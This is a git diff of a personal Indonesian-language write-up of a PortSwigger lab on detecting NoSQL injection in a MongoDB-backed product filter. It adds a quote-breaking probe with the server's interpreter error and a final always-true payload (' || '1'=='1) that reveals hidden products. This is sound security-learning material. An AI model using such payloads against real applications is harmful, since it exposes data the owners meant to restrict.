@@ -9,8 +9,8 @@
 | **Category**         | No SQL Injection                                                                                           |
 | **Difficulty Level** | Apprentice                                                                                                 |
 | **Lab URL**          | [PortSwigger Lab Link](https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-detection) |
-| **Status**           | In progress                                                                                                |
-| **Date Completed**   |                                                                                                            |
+| **Status**           | Solved                                                                                                |
+| **Date Completed**   |          2026-11-18                                                                                                  |
 
 ## Analysis
 
@@ -28,11 +28,40 @@ GET /filter?category=Clothing%2c+shoes+and+accessories
 
 Response dari server adalah halaman HTML beserta produk yang memenuhi kategori tersebut.
 
-**Kedua**, Uji coba query yang memicu `No SQL Injection`
+**Kedua**, Uji coba query parameter yang memicu `No SQL Injection`
+
+Saya mencoba menggunakan payload berikut:
+
+```text
+payload: Clothing, shoes and accessories'''
+response:
+
+Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: missing ; before statement :
+functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
+&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: missing ; before statement :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}
+```
 
 ## Exploitation
+**Pertama**, Sisipkan payload yang memicu kondisi true, dengan memicu kondisi true, akan menyebabkan database menampilkan semua produk yang seharusnya tersembunyi maupun tidak. Jika aplikasi memproses query seperti ini
+
+```
+this.category == 'input' && this.released == 1
+```
+**Kedua**, teruskan request ke browser
+
+
+
+sehingga memicu kondisi true jika `' || '1'=='1`
+
+### Final Exploit
+
+```text
+' || '1'=='1
+```
 
 ## New Knowledge
+- Mempelajari cara kerja `No SQL Injection`
+- Mempelajari cara kerja No SQL database seperti MongoDB
 
 ## References
 
